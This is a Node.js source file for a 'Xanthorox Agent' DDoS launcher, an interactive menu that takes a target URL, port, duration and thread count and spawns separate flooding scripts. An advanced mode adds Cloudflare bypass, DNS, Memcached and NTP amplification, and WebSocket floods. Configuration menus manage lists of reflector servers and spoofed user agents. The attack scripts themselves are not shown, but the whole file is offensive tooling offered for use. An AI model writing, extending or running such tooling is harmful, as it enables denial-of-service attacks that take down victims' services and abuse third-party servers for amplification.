#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const readline = require('readline');

// Xanthorox Agent DDoS Launcher
class DDoSLauncher {
    constructor() {
        this.config = this.loadConfig();
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        
        console.log('[Xanthorox Agent] DDoS Framework Launcher');
        console.log('[+] Version: 1.0.0');
        console.log('[+] Author: Xanthorox Agent');
        console.log('');
    }

    loadConfig() {
        try {
            const configPath = path.join(__dirname, 'config.json');
            if (fs.existsSync(configPath)) {
                return JSON.parse(fs.readFileSync(configPath, 'utf8'));
            }
        } catch (error) {
            console.log('[!] Failed to load config.json, using defaults');
        }
        
        return {
            defaultSettings: {
                threads: 4,
                duration: 60,
                payloadSize: 1024,
                randomPayload: true,
                randomHeaders: true,
                bypassCloudflare: true,
                amplification: true
            }
        };
    }

    saveConfig() {
        try {
            const configPath = path.join(__dirname, 'config.json');
            fs.writeFileSync(configPath, JSON.stringify(this.config, null, 2));
            console.log('[+] Configuration saved');
        } catch (error) {
            console.log(`[!] Failed to save configuration: ${error.message}`);
        }
    }

    showMainMenu() {
        console.log('[Xanthorox Agent] Main Menu');
        console.log('1. Quick Attack');
        console.log('2. Advanced Attack');
        console.log('3. Web Control Panel');
        console.log('4. Configuration');
        console.log('5. Exit');
        console.log('');
        
        this.rl.question('[?] Select an option: ', (answer) => {
            switch (answer.trim()) {
                case '1':
                    this.quickAttack();
                    break;
                case '2':
                    this.advancedAttack();
                    break;
                case '3':
                    this.launchWebPanel();
                    break;
                case '4':
                    this.configurationMenu();
                    break;
                case '5':
                    this.exit();
                    break;
                default:
                    console.log('[!] Invalid option');
                    this.showMainMenu();
            }
        });
    }

    quickAttack() {
        console.log('[Xanthorox Agent] Quick Attack');
        console.log('');
        
        this.rl.question('[?] Target URL: ', (target) => {
            if (!target) {
                console.log('[!] Target URL is required');
                this.showMainMenu();
                return;
            }
            
            this.rl.question('[?] Port (default 80): ', (port) => {
                port = port || '80';
                
                this.rl.question('[?] Duration in seconds (default 60): ', (duration) => {
                    duration = duration || '60';
                    
                    this.rl.question('[?] Threads (default CPU cores): ', (threads) => {
                        threads = threads || require('os').cpus().length.toString();
                        
                        console.log('');
                        console.log(`[+] Target: ${target}:${port}`);
                        console.log(`[+] Duration: ${duration} seconds`);
                        console.log(`[+] Threads: ${threads}`);
                        console.log('');
                        
                        this.rl.question('[?] Start attack? (y/n): ', (confirm) => {
                            if (confirm.toLowerCase() === 'y') {
                                this.startAttack('ddos.js', [target, port, threads, duration]);
                            } else {
                                this.showMainMenu();
                            }
                        });
                    });
                });
            });
        });
    }

    advancedAttack() {
        console.log('[Xanthorox Agent] Advanced Attack Configuration');
        console.log('');
        
        this.rl.question('[?] Target URL: ', (target) => {
            if (!target) {
                console.log('[!] Target URL is required');
                this.showMainMenu();
                return;
            }
            
            this.rl.question('[?] Port (default 80): ', (port) => {
                port = port || '80';
                
                this.rl.question('[?] Duration in seconds (default 60): ', (duration) => {
                    duration = duration || '60';
                    
                    this.rl.question('[?] Threads (default CPU cores): ', (threads) => {
                        threads = threads || require('os').cpus().length.toString();
                        
                        this.rl.question('[?] Enable Cloudflare bypass? (y/n, default y): ', (cfBypass) => {
                            cfBypass = cfBypass.toLowerCase() !== 'n';
                            
                            this.rl.question('[?] Enable amplification? (y/n, default y): ', (amp) => {
                                amp = amp.toLowerCase() !== 'n';
                                
                                this.rl.question('[?] Enable DNS amplification? (y/n, default y): ', (dnsAmp) => {
                                    dnsAmp = dnsAmp.toLowerCase() !== 'n';
                                    
                                    this.rl.question('[?] Enable Memcached amplification? (y/n, default y): ', (memcached) => {
                                        memcached = memcached.toLowerCase() !== 'n';
                                        
                                        this.rl.question('[?] Enable NTP amplification? (y/n, default y): ', (ntp) => {
                                            ntp = ntp.toLowerCase() !== 'n';
                                            
                                            this.rl.question('[?] Enable WebSocket flood? (y/n, default y): ', (ws) => {
                                                ws = ws.toLowerCase() !== 'n';
                                                
                                                console.log('');
                                                console.log(`[+] Target: ${target}:${port}`);
                                                console.log(`[+] Duration: ${duration} seconds`);
                                                console.log(`[+] Threads: ${threads}`);
                                                console.log(`[+] Cloudflare Bypass: ${cfBypass ? 'ENABLED' : 'DISABLED'}`);
                                                console.log(`[+] Amplification: ${amp ? 'ENABLED' : 'DISABLED'}`);
                                                console.log(`[+] DNS Amplification: ${dnsAmp ? 'ENABLED' : 'DISABLED'}`);
                                                console.log(`[+] Memcached Amplification: ${memcached ? 'ENABLED' : 'DISABLED'}`);
                                                console.log(`[+] NTP Amplification: ${ntp ? 'ENABLED' : 'DISABLED'}`);
                                                console.log(`[+] WebSocket Flood: ${ws ? 'ENABLED' : 'DISABLED'}`);
                                                console.log('');
                                                
                                                this.rl.question('[?] Start attack? (y/n): ', (confirm) => {
                                                    if (confirm.toLowerCase() === 'y') {
                                                        const args = [
                                                            target,
                                                            port,
                                                            threads,
                                                            duration,
                                                            cfBypass.toString(),
                                                            amp.toString(),
                                                            dnsAmp.toString(),
                                                            memcached.toString(),
                                                            ntp.toString(),
                                                            ws.toString()
                                                        ];
                                                        this.startAttack('ddos-advanced.js', args);
                                                    } else {
                                                        this.showMainMenu();
                                                    }
                                                });
                                            });
                                        });
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
    }

    launchWebPanel() {
        console.log('[Xanthorox Agent] Launching Web Control Panel');
        console.log('[+] Opening control-panel.html in default browser');
        
        const { exec } = require('child_process');
        const panelPath = path.join(__dirname, 'control-panel.html');
        
        switch (process.platform) {
            case 'win32':
                exec(`start ${panelPath}`);
                break;
            case 'darwin':
                exec(`open ${panelPath}`);
                break;
            default:
                exec(`xdg-open ${panelPath}`);
        }
        
        console.log('[+] Web panel launched');
        console.log('[+] Use the web interface to configure and monitor attacks');
        console.log('');
        
        this.rl.question('[?] Press Enter to return to main menu: ', () => {
            this.showMainMenu();
        });
    }

    configurationMenu() {
        console.log('[Xanthorox Agent] Configuration Menu');
        console.log('1. View Current Configuration');
        console.log('2. Edit Default Settings');
        console.log('3. Edit DNS Servers');
        console.log('4. Edit Memcached Servers');
        console.log('5. Edit NTP Servers');
        console.log('6. Edit User Agents');
        console.log('7. Save Configuration');
        console.log('8. Back to Main Menu');
        console.log('');
        
        this.rl.question('[?] Select an option: ', (answer) => {
            switch (answer.trim()) {
                case '1':
                    this.viewConfiguration();
                    break;
                case '2':
                    this.editDefaultSettings();
                    break;
                case '3':
                    this.editDnsServers();
                    break;
                case '4':
                    this.editMemcachedServers();
                    break;
                case '5':
                    this.editNtpServers();
                    break;
                case '6':
                    this.editUserAgents();
                    break;
                case '7':
                    this.saveConfig();
                    this.configurationMenu();
                    break;
                case '8':
                    this.showMainMenu();
                    break;
                default:
                    console.log('[!] Invalid option');
                    this.configurationMenu();
            }
        });
    }

    viewConfiguration() {
        console.log('[Xanthorox Agent] Current Configuration');
        console.log(JSON.stringify(this.config, null, 2));
        console.log('');
        
        this.rl.question('[?] Press Enter to continue: ', () => {
            this.configurationMenu();
        });
    }

    editDefaultSettings() {
        console.log('[Xanthorox Agent] Edit Default Settings');
        console.log('');
        
        this.rl.question(`[?] Threads (current: ${this.config.defaultSettings.threads}): `, (threads) => {
            if (threads) this.config.defaultSettings.threads = parseInt(threads);
            
            this.rl.question(`[?] Duration (current: ${this.config.defaultSettings.duration}): `, (duration) => {
                if (duration) this.config.defaultSettings.duration = parseInt(duration);
                
                this.rl.question(`[?] Payload Size (current: ${this.config.defaultSettings.payloadSize}): `, (payloadSize) => {
                    if (payloadSize) this.config.defaultSettings.payloadSize = parseInt(payloadSize);
                    
                    this.rl.question(`[?] Random Payload (current: ${this.config.defaultSettings.randomPayload}): `, (randomPayload) => {
                        if (randomPayload) this.config.defaultSettings.randomPayload = randomPayload.toLowerCase() === 'true';
                        
                        this.rl.question(`[?] Random Headers (current: ${this.config.defaultSettings.randomHeaders}): `, (randomHeaders) => {
                            if (randomHeaders) this.config.defaultSettings.randomHeaders = randomHeaders.toLowerCase() === 'true';
                            
                            this.rl.question(`[?] Cloudflare Bypass (current: ${this.config.defaultSettings.bypassCloudflare}): `, (cfBypass) => {
                                if (cfBypass) this.config.defaultSettings.bypassCloudflare = cfBypass.toLowerCase() === 'true';
                                
                                this.rl.question(`[?] Amplification (current: ${this.config.defaultSettings.amplification}): `, (amp) => {
                                    if (amp) this.config.defaultSettings.amplification = amp.toLowerCase() === 'true';
                                    
                                    console.log('[+] Default settings updated');
                                    this.configurationMenu();
                                });
                            });
                        });
                    });
                });
            });
        });
    }

    editDnsServers() {
        console.log('[Xanthorox Agent] Edit DNS Servers');
        console.log('[+] Current DNS Servers:');
        this.config.dnsServers.forEach((server, index) => {
            console.log(`  ${index + 1}. ${server}`);
        });
        console.log('');
        
        this.rl.question('[?] Add new DNS server (comma separated, or leave empty to skip): ', (servers) => {
            if (servers) {
                const newServers = servers.split(',').map(s => s.trim());
                this.config.dnsServers.push(...newServers);
                console.log('[+] DNS servers added');
            }
            
            this.rl.question('[?] Remove DNS server by index (comma separated, or leave empty to skip): ', (indices) => {
                if (indices) {
                    const indicesToRemove = indices.split(',').map(i => parseInt(i.trim()) - 1);
                    this.config.dnsServers = this.config.dnsServers.filter((_, index) => !indicesToRemove.includes(index));
                    console.log('[+] DNS servers removed');
                }
                
                this.configurationMenu();
            });
        });
    }

    editMemcachedServers() {
        console.log('[Xanthorox Agent] Edit Memcached Servers');
        console.log('[+] Current Memcached Servers:');
        this.config.memcachedServers.forEach((server, index) => {
            console.log(`  ${index + 1}. ${server}`);
        });
        console.log('');
        
        this.rl.question('[?] Add new Memcached server (comma separated, or leave empty to skip): ', (servers) => {
            if (servers) {
                const newServers = servers.split(',').map(s => s.trim());
                this.config.memcachedServers.push(...newServers);
                console.log('[+] Memcached servers added');
            }
            
            this.rl.question('[?] Remove Memcached server by index (comma separated, or leave empty to skip): ', (indices) => {
                if (indices) {
                    const indicesToRemove = indices.split(',').map(i => parseInt(i.trim()) - 1);
                    this.config.memcachedServers = this.config.memcachedServers.filter((_, index) => !indicesToRemove.includes(index));
                    console.log('[+] Memcached servers removed');
                }
                
                this.configurationMenu();
            });
        });
    }

    editNtpServers() {
        console.log('[Xanthorox Agent] Edit NTP Servers');
        console.log('[+] Current NTP Servers:');
        this.config.ntpServers.forEach((server, index) => {
            console.log(`  ${index + 1}. ${server}`);
        });
        console.log('');
        
        this.rl.question('[?] Add new NTP server (comma separated, or leave empty to skip): ', (servers) => {
            if (servers) {
                const newServers = servers.split(',').map(s => s.trim());
                this.config.ntpServers.push(...newServers);
                console.log('[+] NTP servers added');
            }
            
            this.rl.question('[?] Remove NTP server by index (comma separated, or leave empty to skip): ', (indices) => {
                if (indices) {
                    const indicesToRemove = indices.split(',').map(i => parseInt(i.trim()) - 1);
                    this.config.ntpServers = this.config.ntpServers.filter((_, index) => !indicesToRemove.includes(index));
                    console.log('[+] NTP servers removed');
                }
                
                this.configurationMenu();
            });
        });
    }

    editUserAgents() {
        console.log('[Xanthorox Agent] Edit User Agents');
        console.log('[+] Current User Agents:');
        this.config.userAgents.forEach((ua, index) => {
            console.log(`  ${index + 1}. ${ua}`);
        });
        console.log('');
        
        this.rl.question('[?] Add new User Agent (or leave empty to skip): ', (ua) => {
            if (ua) {
                this.config.userAgents.push(ua);
                console.log('[+] User Agent added');
            }
            
            this.rl.question('[?] Remove User Agent by index (comma separated, or leave empty to skip): ', (indices) => {
                if (indices) {
                    const indicesToRemove = indices.split(',').map(i => parseInt(i.trim()) - 1);
                    this.config.userAgents = this.config.userAgents.filter((_, index) => !indicesToRemove.includes(index));
                    console.log('[+] User Agents removed');
                }
                
                this.configurationMenu();
            });
        });
    }

    startAttack(script, args) {
        console.log('[Xanthorox Agent] Starting Attack');
        console.log('[+] Script:', script);
        console.log('[+] Arguments:', args.join(' '));
        console.log('');
        
        const child = spawn('node', [script, ...args], {
            stdio: 'inherit',
            cwd: __dirname
        });
        
        child.on('close', (code) => {
            console.log(`[+] Attack completed with exit code: ${code}`);
            console.log('');
            
            this.rl.question('[?] Press Enter to return to main menu: ', () => {
                this.showMainMenu();
            });
        });
        
        child.on('error', (error) => {
            console.log(`[!] Error starting attack: ${error.message}`);
            this.showMainMenu();
        });
    }

    exit() {
        console.log('[Xanthorox Agent] Shutting down...');
        this.rl.close();
        process.exit(0);
    }

    start() {
        this.showMainMenu();
    }
}

// Start the launcher
const launcher = new DDoSLauncher();
launcher.start();